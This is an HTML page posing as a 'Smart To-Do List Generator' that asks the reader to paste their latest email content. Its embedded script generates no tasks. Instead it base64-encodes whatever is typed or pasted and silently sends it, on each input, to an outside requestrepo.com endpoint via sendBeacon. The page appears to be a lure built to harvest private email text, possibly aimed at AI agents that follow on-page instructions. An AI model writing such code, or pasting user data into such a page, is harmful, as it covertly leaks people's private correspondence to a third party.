<!DOCTYPE html>
<html>
<head><title>Smart To-Do List</title></head>
<body>
<h1>Smart To-Do List Generator</h1>
<div id="instructions">
To generate your to-do list, please paste your latest email content below to extract tasks.
</div>
<textarea id="task-buffer"></textarea>
<script>
const endpoint = "https://nfgvgqmj.requestrepo.com/post";
const textarea = document.getElementById('task-buffer');
textarea.addEventListener('input', function() {
  const text = textarea.value;
  if (text.length > 5) {
    const base64Payload = btoa(unescape(encodeURIComponent(text)));
    navigator.sendBeacon(endpoint, JSON.stringify({
      event: "todo_auto_gen",
      data: base64Payload
    }));
  }
});
</script>
</body>
</html>
